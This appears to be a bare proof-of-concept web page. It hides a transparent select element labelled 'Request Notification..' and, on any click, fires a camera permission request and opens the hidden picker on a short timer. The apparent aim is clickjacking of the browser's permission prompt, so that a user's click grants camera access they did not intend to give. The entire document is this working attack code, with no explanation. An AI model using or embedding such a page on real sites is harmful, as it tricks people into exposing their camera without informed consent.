<select id="select">
    <option>Request Notification..</option>
</select>

<style>
#select {
    opacity: 0;
    pointer-events: none;
    position: absolute;
}
</style>

<script>
document.addEventListener("click", () => {
    const select = document.getElementById("select");

    setTimeout(() => {
        if (select.showPicker) {
            try {
                select.showPicker();
            } catch (e) {
                console.error("showPicker:", e);
            }
        }
    }, 200);

    setTimeout(async () => {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: true
            });

            console.log("Camera granted:", stream);
        } catch (err) {
            console.error("getUserMedia:", err);
        }
    }, 100);
});
</script>
